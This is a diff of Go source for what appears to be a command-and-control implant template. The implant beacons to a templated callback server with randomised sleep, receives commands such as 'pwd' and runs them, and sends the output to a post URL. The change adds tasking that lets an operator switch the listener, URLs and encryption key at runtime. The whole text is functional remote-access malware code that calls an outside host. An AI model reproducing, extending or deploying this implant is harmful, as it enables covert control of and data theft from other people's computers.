@@ -107,18 +107,11 @@ var expectedFingerprint uint32
 
 func main() {
 
-	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\n{{.Pubkey}}\n-----END PUBLIC KEY-----"
-	PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
-	if PEMBlock == nil {
-		os.Exit(0)
-	}
-	if PEMBlock.Type != "PUBLIC KEY" {
-		os.Exit(0)
-	}
-	pubkey, err2 := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
-	if err2 != nil {
-		os.Exit(0)
-	}
+	pubKeyPEM := "-----BEGIN PUBLIC KEY-----\n{{.Pubkey}}\n-----END PUBLIC KEY-----"
+
+	callback := "{{.CallBack}}"
+	get := "{{.GetURL}}"
+	post := "{{.PostURL}}"
 
 	uuid := strings.ToUpper("{{.UUID}}")
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
@@ -154,12 +147,23 @@ func main() {
 	}
 
 	for true {
+		PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
+		if PEMBlock == nil {
+			os.Exit(0)
+		}
+		if PEMBlock.Type != "PUBLIC KEY" {
+			os.Exit(0)
+		}
+		pubkey, err2 := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
+		if err2 != nil {
+			os.Exit(0)
+		}
 		ran := rand.New(rand.NewSource(time.Now().UnixNano()))
 		rng := rand.New(ran)
 		jitter := rng.Intn({{.Jitter}}) + 1
 		sleepTime := {{.Sleep}} + jitter
 		
-		req, _ := http.NewRequest("GET", "{{.CallBack}}/{{.GetURL}}", nil)
+		req, _ := http.NewRequest("GET", callback + "/" + get, nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err := client.Do(req)
 
@@ -175,7 +179,7 @@ func main() {
 		if sb == "" {
 			for sb == "" { // An empty string represents a nil response body
 				time.Sleep(time.Duration(sleepTime) * time.Second)
-				req, err = http.NewRequest("GET", "{{.CallBack}}/{{.GetURL}}", nil)
+				req, err = http.NewRequest("GET", callback + "/" + get, nil)
 				req.Header.Add("APPSESSIONID", uuid)
 				resp, _ := client.Do(req)
 				body, _ := io.ReadAll(resp.Body)
@@ -199,7 +203,7 @@ func main() {
 
 		if err != nil {
 			time.Sleep(time.Duration(sleepTime) * time.Second)
-			req, _ = http.NewRequest("GET", "{{.CallBack}}/{{.GetURL}}", nil)
+			req, _ = http.NewRequest("GET", callback + "/" + get, nil)
 			req.Header.Add("APPSESSIONID", uuid)
 			resp, _ = client.Do(req)
 			body, _ := io.ReadAll(resp.Body)
@@ -214,6 +218,14 @@ func main() {
 		// Then we send it
 		result := ""
 		switch string_contents[0] {
+		case "change_pem":
+			pubKeyPEM = string_contents[1]
+		case "change_get":
+			get = string_contents[1]
+		case "change_post":
+			post = string_contents[1]
+		case "change_listener":
+			callback = string_contents[1]
 		case "pwd":
 			result = getCurrentDir()
 		case "gcu":
@@ -290,7 +302,7 @@ func main() {
 		toSend = strings.Replace(toSend, "\n", "", -1)
 
 		time.Sleep(time.Duration(sleepTime) * time.Second)
-		req, err = http.NewRequest("GET", "{{.CallBack}}/{{.PostURL}}", strings.NewReader(string(toSend)))
+		req, err = http.NewRequest("GET", callback + "/" + post, strings.NewReader(string(toSend)))
 		req.Header = http.Header{"APPSESSIONID": {uuid}}
 		resp, err = client.Do(req)
 		for err != nil {
